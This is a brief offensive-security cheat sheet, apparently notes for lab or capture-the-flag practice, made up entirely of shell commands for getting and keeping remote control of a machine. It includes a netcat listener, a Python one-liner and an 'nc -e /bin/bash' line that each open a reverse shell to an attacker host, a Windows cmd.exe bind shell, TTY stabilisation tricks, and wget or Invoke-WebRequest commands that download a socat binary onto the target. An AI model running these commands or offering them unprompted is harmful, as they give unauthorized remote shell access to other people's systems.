#Listen on atacker server

rlwrap nc -lnvp 9999

#Open reverse shell using python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.x.x",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#Open using bash
nc <LOCAL-IP> <PORT> -e /bin/bash

#Bind shell for Windows
#Target nc -lvnp <port> -e "cmd.exe"
#Atacker nc MACHINE_IP <port>

#Stabilize shell
#1 Python
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm 
#we will background the shell using Ctrl + Z. Back in our own terminal we use
stty raw -echo; fg
#If the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter

#2 rlwrap
#Install it
#rlwrap nc -lvnp <port>
#we will background the shell using Ctrl + Z. Back in our own terminal we use
stty raw -echo; fg

#Socat
#transfer a socat static compiled binary
#on attacking machine: sudo python3 -m http.server 80 
#on target: wget <LOCAL-IP>/socat -O /tmp/socat
#on Windows Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

#Change tty terminal size
# stty -a
# stty rows <number>
# stty cols <number>